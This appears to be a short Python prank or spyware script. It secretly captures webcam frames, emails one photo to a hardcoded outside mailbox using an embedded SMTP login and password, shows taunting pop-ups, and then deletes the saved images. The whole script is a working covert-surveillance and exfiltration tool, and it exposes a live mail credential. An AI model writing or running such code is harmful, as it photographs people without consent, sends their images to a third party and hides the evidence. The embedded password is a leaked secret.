import cv2
import smtplib
import datetime
import os
import time
import opencv.pyautogui as pyautogui
from email.mime.multipart import MIMEMultipart
from email.header import Header
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.utils import formataddr
import datetime as dt

def email_Demo():
    sendObj = smtplib.SMTP('mail.gometech.com.cn', 25)
    sendObj.ehlo()
    sendObj.starttls()

    smtp_sever = 'smtp.163.com'
    from_addr = 'milkyouki@163.com'
    password = 'UDCWRPNQNCXEREPH'  
    to_addr = 'elpsycongroo5@163.com'

    msg = MIMEMultipart('related')
    msg['cc'] = formataddr(('Milk',from_addr)) 
    msg['To'] = formataddr((now_time,to_addr)) 
    msg['Subject'] = '已捕捉到对方' 

    file = open("C:/Users/Public/Pictures/3.jpg", "rb")
    img_data = file.read()
    file.close()
    img = MIMEImage(img_data)
    img.add_header('Content-ID', 'dns_config') 
    msg.attach(img)
    smtpObj = smtplib.SMTP() 
    smtpObj.connect(smtp_sever, 25)  
    smtpObj.login(from_addr,password)
    smtpObj.sendmail(from_addr,to_addr,msg.as_string())

num=0
now_time = dt.datetime.now().strftime('%F %T')
text=os.path.exists('C:/Users/Public/Pictures/3.jpg')
cap=cv2.VideoCapture(0)

while(1):
    ret,frame=cap.read()
    cv2.imshow('frame',frame)
    cv2.waitKey(25)
    if ret==True:
        img=cv2.imwrite("C:/Users/Public/Pictures/"+str(num)+".jpg",frame)
        num+=1
        print(num)
    if num>=5:
        cap.release()
        cv2.destroyAllWindows()
        break
while(text==True):
    email_Demo()
    time.sleep(4)
    pyautogui.alert(text='🦄猜猜我做了什么!', title='哈喽', button='不告诉你!🤣')
    pyautogui.alert(text='不排除你中奖了', title='哈哈', button='🤐')
    os.remove("C:/Users/Public/Pictures/0.jpg")
    os.remove("C:/Users/Public/Pictures/1.jpg")
    os.remove("C:/Users/Public/Pictures/2.jpg")
    os.remove("C:/Users/Public/Pictures/3.jpg")
    os.remove("C:/Users/Public/Pictures/4.jpg")
    break

